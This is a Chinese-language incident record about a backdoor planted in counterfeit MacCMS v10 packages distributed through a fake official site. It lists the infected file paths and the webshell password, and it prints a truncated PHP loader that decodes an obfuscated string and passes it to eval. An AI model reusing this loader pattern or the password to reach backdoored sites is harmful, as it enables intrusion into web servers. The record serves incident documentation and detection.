---
source: "hatch 补库批 20260928"
product: "MacCMSv10 counterfeit package"
record_type: "incident"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Maccms后门"
prerequisites: "来源所述条件，未列明部分仍待核：安装假冒站点被植入后门的包，非所有官方v10"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-1c167fea1545287eb24f1823"
entity_id: "ve-1c167fea1545287eb24f1823"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：安装假冒站点被植入后门的包，非所有官方v10

- **事实待核（1）**：标题/影响仅v10易把供应链样本误当官方通用漏洞；缺假冒域名、样本哈希、时间/出处。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：代码$str有省略号是截断示意，不能检测完整样本；password值长度/算法与明文口令关系未说明。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **证据待核（3）**：无请求触发流程，image纯文字占位。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Maccms后门

一、漏洞简介
------------

有人假冒苹果cms官网，发布带有后门的程序。

二、漏洞影响
------------

version v10

三、复现过程
------------

### 后门文件路径

maccms10\\extend\\upyun\\src\\Upyun\\Api\\Format.php

maccms10\\extend\\Qcloud\\Sms\\Sms.php

密码 WorldFilledWithLove

### 后门样本

    <?php
    error_reporting(E_ERROR);
    @ini_set('display_errors','Off');
    @ini_set('max_execution_time',20000);
    @ini_set('memory_limit','256M');
    header("content-Type: text/html; charset=utf-8");
    $password = "0d41c75e2ab34a3740834cdd7e066d90";
    function s(){
     $str = "66756r6374696s6r207374…………"; //大马
     $str = str_rot13($str);
     m($str);
    }
    function m($str){
     global $password;
     $jj = '';
     eval($jj.pack('H*',$str).$jj);
    }
    s();
    ?>

image
